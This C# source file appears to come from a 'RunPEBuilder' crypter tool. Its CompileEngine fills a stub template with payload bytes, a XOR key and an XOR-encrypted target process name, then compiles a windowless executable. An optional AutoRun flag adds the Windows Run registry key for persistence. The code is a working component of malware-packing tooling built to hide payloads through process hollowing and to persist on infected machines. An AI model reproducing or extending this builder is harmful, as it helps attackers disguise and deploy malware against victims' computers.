using Microsoft.CSharp;
using RunPEBuilder.RunSrc;
using System;
using System.CodeDom.Compiler;
using System.IO;

namespace RunPEBuilder.Include
{
    internal class CompileEngine
    {
        public static bool Compilate(string app, string processName, string XorKey, string OutPath, bool AutoRun)
        {
            string csharpcode = Properties.Resources.Stub
                .Replace("%Bytes%", app)
                .Replace("%Key%", XorKey)
                .Replace("%Process%", EncryptEngine.StringEncryptor(processName, XorKey));

            if (AutoRun)
            {
                csharpcode = "#define AutoException\n" + csharpcode.Replace("%REG_KEY%", EncryptEngine.StringEncryptor("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", XorKey));
            }

            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = OutPath,
                CompilerOptions = "/target:winexe",
                IncludeDebugInformation = false
            };

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");

            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode);

                if (results.Errors.Count > 0)
                {
                    using (StreamWriter writer = new StreamWriter("compilation_errors.txt", true)) // true to append to the file
                    {
                        foreach (CompilerError error in results.Errors)
                        {
                            string errorMessage = $"Compilation Error: {error.ErrorText}\n" +
                                                  $"File: {error.FileName}\n" +
                                                  $"Line: {error.Line}, Column: {error.Column}\n" +
                                                  $"Error ID: {error.ErrorNumber}\n" +
                                                  $"This is {(error.IsWarning ? "a warning" : "an error")}\n" +
                                                  new string('-', 50) + "\n";

                            writer.WriteLine(errorMessage);
                        }
                    }
                    throw new InvalidOperationException("Failed to compile the stub source code\n Check -> compilation_errors.txt ");
                }
            }
            return true;
        }
    }
}
